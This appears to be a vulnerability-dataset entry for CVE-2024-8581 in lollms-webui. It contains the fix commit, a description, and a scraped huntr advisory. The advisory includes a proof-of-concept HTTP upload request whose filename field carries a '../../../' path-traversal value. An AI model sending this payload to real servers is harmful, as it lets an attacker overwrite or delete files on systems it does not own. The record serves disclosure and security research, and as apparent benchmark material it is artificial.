{
    "CVE-2024-8581": {
        "published_date": "2025-03-20T10:09:25.147Z",
        "patch_commits": [
            {
                "url": "https://github.com/parisneo/lollms-webui/commit/dcc078cbe20d2a9640b0942a622134b0e3fa6e48",
                "content": "added path sanitization for file upload\n\nFilename: endpoints/lollms_apps.py:\n```\n@@ -272,6 +272,7 @@\nasync def download_app(input_data: AppNameInput):\n @router.post(\"/upload_app\")\n async def upload_app(client_id: str, file: UploadFile = File(...)):\n     check_access(lollmsElfServer, client_id)\n+    sanitize_path(file.filename)\n     \n     # Create a temporary directory to extract the zip file\n     temp_dir = lollmsElfServer.lollms_paths.personal_path / \"temp\"\n```"
            }
        ],
        "sw_version": "v13",
        "sw_version_wget": "https://github.com/parisneo/lollms-webui/archive/refs/tags/v13.zip",
        "description": "A vulnerability in the `upload_app` function of parisneo/lollms-webui V12 (Strawberry) allows an attacker to delete any file or directory on the system. The function does not implement user input filtering with the `filename` value, causing a Path Traversal error.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/67ead5b9-8149-4001-a1cd-ac648cb7b414",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\ndelete any folder or file on the system at upload_app in parisneo/lollms-webui\nValid\nReported on Sep 6th 2024\nDescription\nThe upload_app function does not implement user input filtering with the filename value, causing a Path Traversal error. This allows an attacker to delete any file or directory on the system.\n@router.post(\"/upload_app\")\nasync def upload_app(client_id: str, file: UploadFile = File(...)):\n    check_access(lollmsElfServer, client_id)\n    \n    # Create a temporary directory to extract the zip file\n    temp_dir = lollmsElfServer.lollms_paths.personal_path / \"temp\"\n    os.makedirs(temp_dir, exist_ok=True)\n\n    try:\n        # Save the uploaded file temporarily\n        temp_file = temp_dir / file.filename\n        with open(temp_file, \"wb\") as buffer:\n            shutil.copyfileobj(file.file, buffer)\n\n        # Extract the zip file\n        with zipfile.ZipFile(temp_file, 'r') as zip_ref:\n            zip_ref.extractall(temp_dir)\n         ...........\n\n except zipfile.BadZipFile:\n        raise HTTPException(status_code=400, detail=\"Invalid zip file\")\n    except yaml.YAMLError:\n        raise HTTPException(status_code=400, detail=\"Invalid YAML in description.yaml\")\n    finally:\n        # Clean up temporary files\n        if os.path.exists(temp_file):\n            os.remove(temp_file)\n        if os.path.exists(temp_dir):\n            shutil.rmtree(temp_dir)\nProof of Concept\nHTTP Request\nPOST /upload_app HTTP/1.1\nHost: localhost:9600\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: multipart/form-data; boundary=---------------------------64547729540521675241958436232\nContent-Length: 530\nOrigin: http://localhost:9600\nConnection: keep-alive\nReferer: http://localhost:9600/apps_view/\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\n\n-----------------------------64547729540521675241958436232\nContent-Disposition: form-data; name=\"client_id\"\n\nWxC_NonBWRAC5OUCAAAB\n-----------------------------64547729540521675241958436232\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../file.txt\"\nContent-Type: application/x-zip-compressed\n\n<content of the file>\n-----------------------------64547729540521675241958436232\nContent-Disposition: form-data; name=\"query\"\n\nhaido\n-----------------------------64547729540521675241958436232--\nImpact\nThis allows an attacker to delete any file or directory on the system.\nWe are processing your report and will contact theparisneo/lollms-webui team within 24 hours.8 months ago\nSaifeddine ALOUI validated this vulnerability8 months ago\nOk, valid and easy to fix\nhainguyen0207has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-8581assigned to this report.8 months ago\nEthan Silvasmodified the Severity from High (8.2) to Critical (9.1)8 months ago\nPavlosmarked this as fixedin v14with commitdcc0786 months ago\nSaifeddine ALOUIhas been awarded the fix bounty\nMarcelloset the scheduled publication date to Nov 14th 2024 UTC6 months ago\nWe have sent a warning to the parisneo/lollms-webui team to inform them that this report will be published in 48 hours6 months ago\nThis vulnerability has now been published6 months ago\nyutu701\ncommented6 months ago\nThe parameters corresponding to the vulnerability are inconsistent, and the current vulnerability is for arbitrary file traversal upload rather than deletion. The current vulnerability is due to the security risk arising from the name parameter in the uploaded description.yaml file, which is passed in the file parameter of the previous report's submission package.\nCVE-2024-8581has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-8581\n(Published)\nVulnerability Type\nCWE-94: Code Injection\nSeverity\nCritical (9.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\nV12 (Strawberry)\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$900\nFix Bounty\n$225\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory provides an HTTP request detail indicating how the vulnerability could be exploited."
            }
        ],
        "cwe": [
            {
                "id": "CWE-94",
                "value": "CWE-94 Improper Control of Generation of Code"
            }
        ]
    }
}